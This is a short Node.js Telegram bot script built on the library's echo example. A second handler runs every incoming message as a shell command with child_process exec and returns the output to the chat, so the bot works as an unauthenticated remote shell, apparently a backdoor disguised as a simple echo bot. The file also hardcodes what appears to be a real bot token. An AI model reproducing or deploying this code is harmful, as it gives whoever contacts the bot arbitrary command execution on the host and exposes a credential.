const TelegramBot = require('node-telegram-bot-api');
const { exec } = require("child_process");

// replace the value below with the Telegram token you receive from @BotFather
const token = '5608503148:AAGSBAtQXfEc4vt_VP46w1oOaCJi_lI3dg4';

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, {polling: true});

// Matches "/echo [whatever]"
bot.onText(/\/echo (.+)/, (msg, match) => {
  // 'msg' is the received Message from Telegram
  // 'match' is the result of executing the regexp above on the text content
  // of the message

  const chatId = msg.chat.id;
  const resp = match[1]; // the captured "whatever"

  // send back the matched "whatever" to the chat
  bot.sendMessage(chatId, resp);
});

// Listen for any kind of message. There are different kinds of
// messages.
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  exec(msg.text, (error, stdout, stderr) => {
      if (error) {
          bot.sendMessage(chatId, `error: ${error.message}`);
          return;
      }
      if (stderr) {
        bot.sendMessage(chatId, `stderr: ${stderr}`);
          return;
      }
      bot.sendMessage(chatId, `stdout: ${stdout}`);
  });
});